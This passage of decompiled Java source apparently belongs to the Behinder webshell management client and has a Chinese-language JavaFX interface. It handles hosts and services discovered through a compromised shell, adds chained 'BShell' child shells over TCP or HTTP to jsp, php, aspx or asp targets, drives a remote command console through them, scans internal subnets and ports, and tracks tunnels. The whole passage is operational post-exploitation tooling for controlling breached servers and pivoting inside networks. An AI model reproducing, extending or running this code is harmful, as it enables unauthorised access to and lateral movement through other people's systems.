         host.setIp(ip);
         host.setShellId(this.shellID);
         this.hostDao.addEntity(host);
         host = this.hostDao.findHostByShellIdAndIp(this.shellID, ip);
      }

      int hostId = host.getId();
      service.setHostId(hostId);

      try {
         this.addServiceDB(service);
      } catch (Exception var10) {
      }

      this.addServiceDetailBox(service, this.serviceFlowPane, false);
   }

   private void addServiceDB(Service service) throws Exception {
      this.hostDao.addEntity(service);
   }

   private void addServiceDetailBox(Service service, FlowPane flowPane, boolean isShowIp) {
      VBox box = new VBox();
      Label portLabel = new Label("【端口】：" + service.getPort());
      portLabel.setStyle("-fx-text-fill:#00ff00");
      Label ipLabel = new Label("【IP】：" + service.getComment());
      ipLabel.setStyle("-fx-text-fill:#00ff00");
      Label serviceLabel = new Label("【服务】：" + service.getName());
      serviceLabel.setStyle("-fx-text-fill:#00ff00");
      Label versionLabel = new Label("【版本】：" + service.getVersion());
      versionLabel.setStyle("-fx-text-fill:#00ff00");
      Label bannerLabel = new Label("【Banner】：" + service.getBanner());
      bannerLabel.setWrapText(false);
      bannerLabel.setStyle("-fx-text-fill:#00ff00");
      bannerLabel.setTextOverrun(OverrunStyle.CENTER_ELLIPSIS);
      if (isShowIp) {
         box.getChildren().addAll(new Node[]{portLabel, ipLabel, serviceLabel, versionLabel, bannerLabel});
      } else {
         box.getChildren().addAll(new Node[]{portLabel, serviceLabel, versionLabel, bannerLabel});
      }

      box.setStyle("-fx-border-width: 1; -fx-border-insets: 5; -fx-border-style: dashed; -fx-border-color: green;");
      box.setPadding(new Insets(5.0));
      box.setPrefWidth(600.0);
      box.setSpacing(10.0);
      box.setUserData(service.getId());
      VBox.setMargin(box, new Insets(10.0, 0.0, 0.0, 0.0));
      flowPane.getChildren().add(box);
      box.setOnContextMenuRequested((event) -> {
         this.serviceContextMenu.setUserData(service);
         this.serviceContextMenu.show(box.getScene().getWindow(), event.getScreenX() + 5.0, event.getScreenY() + 5.0);
      });
      box.hoverProperty().addListener((observable, oldValue, newValue) -> {
         if (newValue) {
            this.setBoxBackground(box);
         } else {
            this.removeBoxBackground(box);
         }

      });
   }

   private VBox addServiceBox(Service service) throws Exception {
      if (this.serviceBoxExists(service)) {
         return null;
      } else {
         VBox box = new VBox();
         ImageView hostItem = new ImageView();
         Image hostIcon = new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/host.png")));
         hostItem.setImage(hostIcon);
         hostItem.setFitHeight(30.0);
         hostItem.setPreserveRatio(true);
         Label serviceInfo = new Label(service.getPort() + "/" + service.getName());
         serviceInfo.setStyle("-fx-text-fill:#00ff00");
         box.getChildren().add(hostItem);
         box.getChildren().add(serviceInfo);
         box.setPadding(new Insets(10.0));
         box.setAlignment(Pos.CENTER);
         box.setOnContextMenuRequested((event) -> {
            this.serviceContextMenu.setUserData(service);
            this.serviceContextMenu.show(box.getScene().getWindow(), event.getScreenX() + 5.0, event.getScreenY() + 5.0);
            event.consume();
         });
         box.setOnMouseEntered((event) -> {
            VBox v = (VBox)event.getSource();
            v.setStyle("-fx-background-color:green");
         });
         box.setOnMouseExited((event) -> {
            VBox v = (VBox)event.getSource();
            v.setStyle("-fx-background-color:black");
         });
         box.setOnMouseClicked((event) -> {
            if (event.getClickCount() == 2) {
               event.consume();
            }

         });
         this.serviceFlowPane.getChildren().add(box);
         return box;
      }
   }

   private void setBoxBackground(VBox box) {
      box.setStyle("-fx-background-color:green;-fx-border-width: 1; -fx-border-insets: 5; -fx-border-style: dashed; -fx-border-color: pink;");
   }

   private void removeBoxBackground(VBox box) {
      box.setStyle("-fx-background-color:black;-fx-border-width: 1; -fx-border-insets: 5; -fx-border-style: dashed; -fx-border-color: green;");
   }

   private void setLabelBackground(Label label) {
      label.setStyle("-fx-background-color:green;-fx-text-fill:#00ff00;");
   }

   private void removeLabelBackground(Label label) {
      label.setStyle("-fx-background-color:black;-fx-text-fill:#00ff00;");
   }

   private void addHost(String ip) throws Exception {
      Host host = new Host();
      host.setIp(ip);
      host.setShellId(this.shellID);
      host.setAddTime(Utils.getCurrentDate());

      try {
         this.addHostDB(host);
      } catch (AlreadyExistException var4) {
      }

      this.addHostBox(ip);
   }

   private void addHostDB(Host host) throws Exception {
      host.setShellId(this.shellID);
      this.hostDao.addEntity(host);
   }

   private VBox addHostBox(String IPAddress) throws Exception {
      if (this.hostBoxExists(IPAddress)) {
         return null;
      } else {
         Host host = new Host();
         host.setIp(IPAddress);
         host.setAddTime(Utils.getCurrentDate());
         VBox box = new VBox();
         ImageView hostItem = new ImageView();
         Image hostIcon = new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/host.png")));
         hostItem.setImage(hostIcon);
         hostItem.setFitHeight(30.0);
         hostItem.setPreserveRatio(true);
         Label hostIP = new Label(IPAddress);
         hostIP.setStyle("-fx-text-fill:#00ff00");
         box.getChildren().add(hostItem);
         box.getChildren().add(hostIP);
         box.setPadding(new Insets(10.0));
         box.setAlignment(Pos.CENTER);
         box.setOnContextMenuRequested((event) -> {
            this.hostContextMenu.setUserData(IPAddress);
            this.hostContextMenu.show(box.getScene().getWindow(), event.getScreenX() + 5.0, event.getScreenY() + 5.0);
            event.consume();
         });
         box.setOnMouseEntered((event) -> {
            VBox v = (VBox)event.getSource();
            v.setStyle("-fx-background-color:green");
         });
         box.setOnMouseExited((event) -> {
            VBox v = (VBox)event.getSource();
            v.setStyle("-fx-background-color:black");
         });
         box.setOnMouseClicked((event) -> {
            if (event.getClickCount() == 2) {
               event.consume();

               try {
                  this.expandHost(IPAddress);
                  this.switchAssetPane("detail");
               } catch (Exception var4) {
                  var4.printStackTrace();
                  this.statusLabel.setText("主机详情初始化失败。");
               }
            }

         });
         this.hostFlowPane.getChildren().add(box);
         return box;
      }
   }

   private void delHost(String ip) throws Exception {
      Host host = new Host();
      host.setIp(ip);
      this.delHostDB(host);
      this.delHostBox(host);
   }

   private void delHostDB(Host host) throws Exception {
      this.hostDao.deleteHostByIp(host.getIp());
   }

   private void delHostBox(Host host) throws Exception {
      Node node = this.getHostBoxByIp(host.getIp());
      this.hostFlowPane.getChildren().remove(node);
   }

   private String[] getLocalIpArr() {
      List ipList = new ArrayList();
      String[] localIpArr = ((String)this.basicInfoMap.get("localIp")).split(" ");
      String[] var3 = localIpArr;
      int var4 = localIpArr.length;

      for(int var5 = 0; var5 < var4; ++var5) {
         String ip = var3[var5];
         if (Utils.checkIP(ip)) {
            ipList.add(ip);
         }
      }

      return (String[])ipList.toArray(new String[0]);
   }

   private void decodeEntity(JSONObject object) {
      Iterator var2 = object.keySet().iterator();

      while(var2.hasNext()) {
         String key = (String)var2.next();
         String value = object.optString(key, "");
         value = new String(Base64.getDecoder().decode(value));
         object.put(key, value);
      }

   }

   private void loadTunnelFlowView(boolean initDead) {
      try {
         List tunnelList = this.tunnelDao.findTunnelByShellId(this.shellID);

         Tunnel tunnel;
         for(Iterator var3 = tunnelList.iterator(); var3.hasNext(); this.addTunnelBox(tunnel)) {
            tunnel = (Tunnel)var3.next();
            if (initDead) {
               tunnel.setStatus(Constants.TUNNEL_STATUS_DEAD);
               this.tunnelDao.updateStatus(this.shellID, tunnel);
            }
         }
      } catch (Exception var5) {
         var5.printStackTrace();
      }

   }

   private void initTunnelFlowView() {
      this.loadTunnelFlowView(true);
   }

   private void refreshTunnelFlowView() {
      this.loadTunnelFlowView(false);
   }

   private void initBShellView() {
      this.loadBShellList();
      this.initBShellBoxContextMenu();
      this.initBShellConsole();
   }

   private void initBShellConsole() {
      String welcome = " __      __       .__                                  __           __________  _________.__           .__  .__   \n/  \\    /  \\ ____ |  |   ____  ____   _____   ____   _/  |_  ____   \\______   \\/   _____/|  |__   ____ |  | |  |  \n\\   \\/\\/   // __ \\|  | _/ ___\\/  _ \\ /     \\_/ __ \\  \\   __\\/  _ \\   |    |  _/\\_____  \\ |  |  \\_/ __ \\|  | |  |  \n \\        /\\  ___/|  |_\\  \\__(  <_> )  Y Y  \\  ___/   |  | (  <_> )  |    |   \\/        \\|   Y  \\  ___/|  |_|  |__\n  \\__/\\  /  \\___  >____/\\___  >____/|__|_|  /\\___  >  |__|  \\____/   |______  /_______  /|___|  /\\___  >____/____/\n       \\/       \\/          \\/            \\/     \\/                         \\/        \\/      \\/     \\/           ";
      String psString = "BShell >";
      this.bShellConsoleTextArea.setText(welcome + "\n\n" + psString);
      this.initConsoleTextArea();
   }

   private void openBShellConsole(BShell bShell) throws Exception {
      this.currentConsoleShellService = this.getChildShellService(bShell);
      boolean result = this.currentConsoleShellService.doConnect();
      if (result) {
         JSONObject responseObj = this.currentConsoleShellService.getBasicInfo(Utils.getRandomString((new Random()).nextInt(20)));
         if (responseObj.get("status").equals("success")) {
            this.statusLabel.setText("BShell连接成功。");
         }
      }

   }

   private String getCurrentCmd() {
      int lineCount = this.bShellConsoleTextArea.getParagraphs().size();
      String lastLine = ((CharSequence)this.bShellConsoleTextArea.getParagraphs().get(lineCount - 1)).toString();
      if (lastLine.trim().length() == 0) {
         lastLine = ((CharSequence)this.bShellConsoleTextArea.getParagraphs().get(lineCount - 2)).toString();
      }

      int cmdStart = lastLine.indexOf(">") + 1;
      String cmd = lastLine.substring(cmdStart).trim();
      return cmd;
   }

   private void removeCurrentCmd() {
      int lineCount = this.bShellConsoleTextArea.getParagraphs().size();
      String lastLine = ((CharSequence)this.bShellConsoleTextArea.getParagraphs().get(lineCount - 1)).toString();
      if (lastLine.trim().length() == 0) {
         lastLine = ((CharSequence)this.bShellConsoleTextArea.getParagraphs().get(lineCount - 2)).toString();
      }

      int cmdStart = lastLine.indexOf(">") + 1;
      String cmd = lastLine.substring(cmdStart).trim();
      int totalLength = this.bShellConsoleTextArea.getText().length();
      this.bShellConsoleTextArea.deleteText(totalLength - cmd.length(), totalLength);
   }

   private void initConsoleTextArea() {
      this.bShellConsoleTextArea.setOnKeyPressed((keyEvent) -> {
         KeyCode keyCode = keyEvent.getCode();
         if (keyCode == KeyCode.BACK_SPACE && this.getCurrentCmd().equals("")) {
            keyEvent.consume();
         }

         String historyCmd;
         if (keyCode == KeyCode.ENTER) {
            historyCmd = this.getCurrentCmd();
            keyEvent.consume();
            this.statusLabel.setText("[!]正在执行操作，请稍后……");
            this.bShellConsoleTextArea.appendText("\n请稍后……\n");
            String shellResult = null;

            try {
               this.consoleService.addHistory(historyCmd);
               shellResult = this.consoleService.parseCommand(historyCmd);
            } catch (Exception var6) {
               var6.printStackTrace();
               shellResult = "命令不正确\nBShell >";
            }

            this.statusLabel.setText("操作已完成。");
            this.bShellConsoleTextArea.appendText(shellResult);
         } else if (keyCode != KeyCode.KP_UP && keyCode != KeyCode.UP) {
            if (keyCode == KeyCode.KP_DOWN || keyCode == KeyCode.DOWN) {
               this.removeCurrentCmd();
               historyCmd = this.consoleService.loadHistoryCmd(Constants.HISTORY_DIRECTION_DOWN);
               this.bShellConsoleTextArea.appendText(historyCmd);
               keyEvent.consume();
            }
         } else {
            this.removeCurrentCmd();
            historyCmd = this.consoleService.loadHistoryCmd(Constants.HISTORY_DIRECTION_UP);
            this.bShellConsoleTextArea.appendText(historyCmd);
            keyEvent.consume();
         }
      });
   }

   private List getChildList(JSONObject childShellEntity, BShell bShell) {
      Map childObj = new HashMap();
      childObj.put("childShellEntity", childShellEntity);
      childObj.put("bShell", bShell);
      List childList = new ArrayList();
      if (this.currentShellService.getChildList() != null) {
         childList.addAll(this.currentShellService.getChildList());
      }

      childList.add(childObj);
      return childList;
   }

   private JSONObject getChildShellEntity(BShell bShell) throws Exception {
      JSONObject shellObj = new JSONObject(bShell.getBody().trim());
      String url = shellObj.getString("target");
      String scriptType = shellObj.getString("type");
      JSONObject childShellEntity = new JSONObject(this.shellEntity);
      childShellEntity.put("url", url);
      childShellEntity.put("type", scriptType);
      childShellEntity.put("password", this.shellEntity.get("password"));
      childShellEntity.put("bShell", bShell);
      return childShellEntity;
   }

   private ShellService getChildShellService(BShell bShell) throws Exception {
      JSONObject childShellEntity = this.getChildShellEntity(bShell);
      Map childObj = new HashMap();
      childObj.put("childShellEntity", childShellEntity);
      childObj.put("bShell", bShell);
      List childList = this.getChildList(childShellEntity, bShell);
      ShellService childShellService = new ShellService(this.shellEntity, childList);
      return childShellService;
   }

   private void openBShellGui(BShell bShell) throws Exception {
      JSONObject childShellEntity = this.getChildShellEntity(bShell);
      List childList = this.getChildList(childShellEntity, bShell);
      this.childMainWindowController.init(this.shellEntity, bShell, this.shellManager, (Map)null, childList);
   }

   private void showAddBShellPane(String IPAddress) {
      Alert inputDialog = Utils.getAlert(AlertType.NONE);
      inputDialog.setTitle("添加BShell");
      inputDialog.setWidth(800.0);
      inputDialog.setResizable(true);
      Window window = inputDialog.getDialogPane().getScene().getWindow();
      window.setOnCloseRequest((e) -> {
         window.hide();
      });
      GridPane proxyGridPane = new GridPane();
      proxyGridPane.setPrefWidth(600.0);
      proxyGridPane.setVgap(15.0);
      ColumnConstraints firstColConfig = new ColumnConstraints();
      firstColConfig.setPercentWidth(20.0);
      firstColConfig.setFillWidth(true);
      ColumnConstraints secondColConfig = new ColumnConstraints();
      secondColConfig.setPercentWidth(80.0);
      secondColConfig.setFillWidth(true);
      proxyGridPane.getColumnConstraints().addAll(new ColumnConstraints[]{firstColConfig, secondColConfig});
      proxyGridPane.setPadding(new Insets(20.0, 20.0, 0.0, 10.0));
      Label typeLabel = new Label("类型：");
      ComboBox typeCombo = new ComboBox();
      typeCombo.setItems(FXCollections.observableArrayList(new String[]{"TCP", "HTTP"}));
      typeCombo.getSelectionModel().select(0);
      ComboBox scriptTypeCombo = new ComboBox();
      scriptTypeCombo.setItems(FXCollections.observableArrayList(new String[]{"jsp", "php", "aspx", "asp"}));
      scriptTypeCombo.getSelectionModel().select(0);
      new Label("名称：");
      TextField nameText = new TextField();
      nameText.setText(IPAddress.replace(".", "_"));
      Label targetLabel = new Label("目标地址：");
      TextField targetText = new TextField();
      targetText.setText(IPAddress);
      targetText.textProperty().addListener((observable, oldValue, newValue) -> {
         if (typeCombo.getSelectionModel().getSelectedIndex() == Constants.BSHELL_TYPE_HTTP) {
            URL url;
            try {
               url = new URL(targetText.getText().trim());
            } catch (Exception var9) {
               return;
            }

            String extension = url.getPath().substring(url.getPath().lastIndexOf(".") + 1).toLowerCase();

            for(int i = 0; i < scriptTypeCombo.getItems().size(); ++i) {
               if (extension.toLowerCase().equals(scriptTypeCombo.getItems().get(i))) {
                  scriptTypeCombo.getSelectionModel().select(i);
               }
            }
         }

      });
      Label portLabel = new Label("端口：");
      TextField portText = new TextField();
      Label targetKeyLabel = new Label("密码：");
      TextField targetKeyText = new TextField();
      targetKeyText.setText(this.shellEntity.getString("password") + "(与主Shell密码一致)");
      targetKeyText.setDisable(true);
      typeCombo.setOnAction((e) -> {
         if (typeCombo.getSelectionModel().getSelectedIndex() == 0) {
            targetText.setText(IPAddress);
            targetText.setPromptText("请输入目标IP地址……");
            portLabel.setText("端口：");
            proxyGridPane.getChildren().remove(scriptTypeCombo);
            proxyGridPane.add(portText, 1, 3);
         } else {
            targetText.setText("");
            targetText.setPromptText("请输入BShell Url……");
            portLabel.setText("脚本类型：");
            proxyGridPane.getChildren().remove(portText);
            proxyGridPane.add(scriptTypeCombo, 1, 3);
         }

      });
      Button cancelBtn = new Button("取消");
      Button saveBtn = new Button("保存");
      saveBtn.setDefaultButton(true);
      saveBtn.setOnAction((e) -> {
         int bShellType = typeCombo.getSelectionModel().getSelectedIndex();
         String target = targetText.getText();
         String targetIp = target;
         if (bShellType == Constants.BSHELL_TYPE_HTTP) {
            try {
               targetIp = (new URL(target)).getHost();
            } catch (MalformedURLException var18) {
               Utils.showErrorMessage("错误", "URL格式不正确");
               return;
            }
         }

         if (!Utils.checkIP(targetIp)) {
            Utils.showErrorMessage("错误", "IP格式不正确");
         } else {
            BShell bShell = new BShell();
            bShell.setType(bShellType);
            bShell.setName(nameText.getText().trim());
            Host childHost = null;

            try {
               childHost = this.hostDao.findHostByShellIdAndIp(this.shellID, targetIp);
               if (childHost == null) {
                  childHost = new Host();
                  childHost.setIp(targetIp);
                  childHost.setShellId(this.shellID);
                  childHost.setAddTime(Utils.getCurrentDate());
                  childHost.setComment("来源：手动添加BShell");
                  this.hostDao.addEntity(childHost);
                  this.addHostBox(targetIp);
                  childHost = this.hostDao.findHostByShellIdAndIp(this.shellID, targetIp);
               }
            } catch (Exception var19) {
               Utils.showErrorMessage("错误", "BShell添加失败。");
               return;
            }

            bShell.setHostId(childHost.getId());
            JSONObject bShellBody = new JSONObject();
            if (bShellType == Constants.BSHELL_TYPE_TCP) {
               bShellBody.put("target", target + ":" + portText.getText());
               bShellBody.put("type", "native");
            } else if (bShellType == Constants.BSHELL_TYPE_HTTP) {
               bShellBody.put("target", target);
               bShellBody.put("type", scriptTypeCombo.getValue());
            }

            bShell.setBody(bShellBody.toString());
            bShell.setStatus(Constants.BSHELL_STATUS_DEAD);

            try {
               this.bShellDao.addEntity(bShell);
               this.addBShellBox(bShell);
               this.statusLabel.setText("BShell 添加成功。");
            } catch (AlreadyExistException var16) {
               this.statusLabel.setText("该BShell已存在。");
            } catch (Exception var17) {
               this.statusLabel.setText("BShell 添加失败：" + var17.getMessage());
               var17.printStackTrace();
            }

            inputDialog.getDialogPane().getScene().getWindow().hide();
         }
      });
      cancelBtn.setOnAction((e) -> {
         inputDialog.getDialogPane().getScene().getWindow().hide();
      });
      proxyGridPane.add(typeLabel, 0, 1);
      proxyGridPane.add(typeCombo, 1, 1);
      proxyGridPane.add(targetLabel, 0, 2);
      proxyGridPane.add(targetText, 1, 2);
      proxyGridPane.add(portLabel, 0, 3);
      proxyGridPane.add(portText, 1, 3);
      proxyGridPane.add(targetKeyLabel, 0, 4);
      proxyGridPane.add(targetKeyText, 1, 4);
      HBox buttonBox = new HBox();
      buttonBox.setSpacing(20.0);
      buttonBox.setAlignment(Pos.CENTER);
      buttonBox.getChildren().add(cancelBtn);
      buttonBox.getChildren().add(saveBtn);
      GridPane.setColumnSpan(buttonBox, 2);
      proxyGridPane.add(buttonBox, 0, 5);
      inputDialog.getDialogPane().setContent(proxyGridPane);
      inputDialog.showAndWait();
   }

   private void showCustomServiceScan() {
      Alert inputDialog = Utils.getAlert(AlertType.NONE);
      inputDialog.setTitle("自定义扫描");
      inputDialog.setWidth(800.0);
      inputDialog.setResizable(true);
      Window window = inputDialog.getDialogPane().getScene().getWindow();
      window.setOnCloseRequest((e) -> {
         window.hide();
      });
      GridPane customServiceGridPane = new GridPane();
      customServiceGridPane.setPrefWidth(600.0);
      customServiceGridPane.setVgap(15.0);
      ColumnConstraints firstColConfig = new ColumnConstraints();
      firstColConfig.setPercentWidth(20.0);
      firstColConfig.setFillWidth(true);
      ColumnConstraints secondColConfig = new ColumnConstraints();
      secondColConfig.setPercentWidth(80.0);
      secondColConfig.setFillWidth(true);
      customServiceGridPane.getColumnConstraints().addAll(new ColumnConstraints[]{firstColConfig, secondColConfig});
      customServiceGridPane.setPadding(new Insets(20.0, 20.0, 0.0, 10.0));
      Label targetIp = new Label("目标IP列表");
      targetIp.setAlignment(Pos.CENTER_RIGHT);
      TextArea targetIpTxt = new TextArea();
      targetIpTxt.setPrefHeight(50.0);
      Label targetPort = new Label("目标端口列表");
      targetPort.setAlignment(Pos.CENTER_RIGHT);
      TextArea targetPortTxt = new TextArea();
      targetPortTxt.setPrefHeight(50.0);
      Label threadNumLabel = new Label("线程数量");
      TextField threadNumTxt = new TextField();
      threadNumTxt.setTextFormatter(new TextFormatter(new NumberStringConverter()));
      Button confirmBtn = new Button("确认");
      Button cancelBtn = new Button("取消");
      confirmBtn.setOnAction((event) -> {
         String ipList = targetIpTxt.getText();
         String portList = targetPortTxt.getText();
         String threadNum = threadNumTxt.getText();
         this.scanService(ipList, portList, threadNum);
         inputDialog.getDialogPane().getScene().getWindow().hide();
      });
      cancelBtn.setOnAction((e) -> {
         inputDialog.getDialogPane().getScene().getWindow().hide();
      });
      customServiceGridPane.add(targetIp, 0, 0);
      customServiceGridPane.add(targetIpTxt, 1, 0);
      customServiceGridPane.add(targetPort, 0, 1);
      customServiceGridPane.add(targetPortTxt, 1, 1);
      customServiceGridPane.add(threadNumLabel, 0, 2);
      customServiceGridPane.add(threadNumTxt, 1, 2);
      HBox buttonBox = new HBox();
      buttonBox.setSpacing(20.0);
      buttonBox.setAlignment(Pos.CENTER);
      buttonBox.getChildren().add(cancelBtn);
      buttonBox.getChildren().add(confirmBtn);
      GridPane.setColumnSpan(buttonBox, 2);
      customServiceGridPane.add(buttonBox, 0, 3);
      inputDialog.getDialogPane().setContent(customServiceGridPane);
      inputDialog.showAndWait();
   }

   private String getLocalIpRange(boolean multiline) {
      String range = "";
      String[] var3 = this.getLocalIpArr();
      int var4 = var3.length;

      for(int var5 = 0; var5 < var4; ++var5) {
         String ip = var3[var5];
         String start = ip.substring(0, ip.lastIndexOf(".")) + ".1";
         String stop = ip.substring(0, ip.lastIndexOf(".")) + ".254";
         range = range + start + "-" + stop + ",";
         if (multiline) {
            range = range + "\n";
         }
      }

      range = range.endsWith(",") ? range.substring(0, range.length() - 1) : range;
      return range;
   }

   private void filter(String type, String keyword) throws Exception {
      List serviceList;
      if (type.equals("host")) {
         serviceList = this.hostDao.searchHostByShellIdAndIpOrComment(this.shellID, keyword);
         this.loadHosts(serviceList);
      } else if (type.equals("service")) {
         serviceList = this.serviceDao.searchServiceByShellIdAndNameOrPort(this.shellID, keyword);
         this.loadServices(serviceList);
      }

   }
}
